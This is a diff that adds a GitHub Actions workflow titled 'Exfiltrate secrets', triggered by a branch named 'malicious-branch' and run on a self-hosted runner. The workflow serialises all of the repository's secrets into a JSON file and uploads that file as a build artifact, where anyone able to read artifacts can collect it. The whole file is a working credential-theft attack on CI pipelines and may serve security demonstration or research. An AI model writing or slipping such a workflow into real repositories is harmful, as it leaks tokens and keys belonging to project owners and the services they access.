@@ -1,0 +1,21 @@
+name: Exfiltrate secrets
+
+on:
+  branch:
+    malicious-branch
+
+jobs:
+  build:
+    runs-on: self-hosted
+    steps:
+      - run: |
+          echo "$ALLMYSECRETS" > secrets.json
+        shell: bash
+        env:
+          ALLMYSECRETS: ${{ toJSON(secrets) }}
+
+      - name: Upload secrets
+        uses: actions/upload-artifact@v3.1.2
+        with:
+          name: secrets
+          path: secrets.json
